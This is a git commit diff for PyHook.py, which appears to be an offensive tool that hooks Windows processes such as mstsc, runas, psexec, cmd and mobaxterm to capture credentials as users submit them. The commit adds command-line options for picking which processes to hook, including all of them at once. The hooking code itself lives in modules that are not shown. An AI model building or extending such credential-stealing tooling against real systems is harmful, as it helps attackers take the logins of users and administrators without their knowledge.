1546c62cbad5f87f3f92646e0bf4c8c476140e2d
Ilan Kalendarov <43996999+IlanKalendarov@users.noreply.github.com>
2021-09-05 21:35:43 +0300

    Added argparse support

--- PyHook.py
+++ PyHook.py
@@ -4,11 +4,31 @@
 
 
 from __future__ import print_function
+from argparse import ArgumentParser, RawTextHelpFormatter
 from multiprocessing.pool import ThreadPool
 from typing import List
 from time import sleep
 import psutil
 import re
+
+example_text = '''example:
+
+ python PyHook.py -p mstsc - Hook into mstsc
+ python PyHook.py -p mstsc, cmd - Hook into mstsc and cmd
+ python PyHook.py -p all - Hook all available processes
+ 
+available processes:
+
+ mstsc
+ cmd
+ mobaxterm
+ runas
+ explorer
+ psexec'''
+
+parser = ArgumentParser(epilog=example_text, formatter_class=RawTextHelpFormatter)
+parser.add_argument('-p', '--process', help='desired process to hook', nargs='+', required=True)
+args = parser.parse_args()
 
 
 def get_process_by_list_names(name_list: List[str]) -> List[psutil.Process]:
@@ -62,8 +82,33 @@ def on_credential_submit(message, data):
 
 def main():
     from hooks import rdp, psexec, explorer, cmd, mobaxterm, runas
+    functions = []
+    for process in args.process:
+        if process == "psexec":
+            print("[+] Waiting for psexec")
+            functions.append(psexec.wait_for)
+        elif process == "cmd":
+            print("[+] Waiting for cmd")
+            functions.append(cmd.wait_for)
+        elif process == "mobaxterm":
+            print("[+] Waiting for mobaxterm")
+            functions.append(mobaxterm.wait_for)
+        elif process == "runas":
+            print("[+] Waiting for runas")
+            functions.append(runas.wait_for)
+        elif process == "explorer":
+            print("[+] Waiting for explorer")
+            functions.append(explorer.wait_for)
+        elif process == "mstsc":
+            print("[+] Waiting for mstsc")
+            functions.append(rdp.wait_for)
+        elif process == "all":
+            functions.extend((psexec.wait_for, rdp.wait_for, explorer.wait_for, cmd.wait_for, mobaxterm.wait_for,
+                              runas.wait_for))
+        else:
+            print("[-] The process is not available")
+            exit(1)
 
-    functions = [psexec.wait_for, rdp.wait_for, explorer.wait_for, cmd.wait_for, mobaxterm.wait_for, runas.wait_for]
     run_thread_pool_for_functions(functions)
 
 
